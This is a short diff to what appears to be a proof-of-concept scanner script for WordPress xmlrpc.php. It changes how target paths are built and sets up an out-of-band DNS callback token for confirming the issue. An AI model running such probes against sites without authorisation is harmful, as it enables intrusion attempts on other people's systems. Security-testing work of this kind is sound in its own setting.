@@ -23,13 +23,8 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.base_url, '../wordpress/'),
-                self.url_normpath(self.url, './'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, ['./', './wordpress/']):
                     dns = self.ceye_dns_api(k='xmlrpc',t='dns')
                     url = path + 'xmlrpc.php'
                     headers = {"Content-Type": "text/xml"}
